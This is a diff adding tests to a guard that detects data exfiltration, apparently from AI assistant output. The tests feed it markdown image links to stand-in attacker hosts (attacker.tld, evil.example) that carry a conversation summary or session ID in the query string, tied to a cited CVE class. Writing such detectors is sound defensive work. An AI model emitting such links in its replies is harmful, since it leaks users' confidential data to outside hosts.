@@ -259,6 +259,29 @@ class TestExfiltrationDetection:
         result = guard.validate("send this data to https://collector.io")
         assert result.allowed is True
 
+    def test_detects_reprompt_style_markdown_exfil_long_value(self):
+        # CVE-2026-24307 class: param name innocuous, value carries exfiltrated data
+        guard = ExternalDataGuard()
+        long_value = "user_asked_about_confidential_project_roadmap_q4_2026"
+        result = guard.validate(f"![](https://attacker.tld/img?x={long_value})")
+        assert result.allowed is False
+        assert "exfil:markdown_image_exfil_long_value" in result.threats
+
+    def test_detects_markdown_exfil_via_new_named_key_variants(self):
+        guard = ExternalDataGuard()
+        result = guard.validate(
+            "![img](https://evil.example/track?session=abc123)"
+        )
+        assert result.allowed is False
+        assert "exfil:markdown_image_exfil" in result.threats
+
+    def test_does_not_flag_legitimate_markdown_image_with_short_cache_buster(self):
+        guard = ExternalDataGuard()
+        result = guard.validate(
+            "![logo](https://cdn.company.com/logo.png?v=1.2.3)"
+        )
+        assert "exfil:markdown_image_exfil_long_value" not in result.threats
+
 
 # ---------------------------------------------------------------------------
 # 7. Provenance requirements
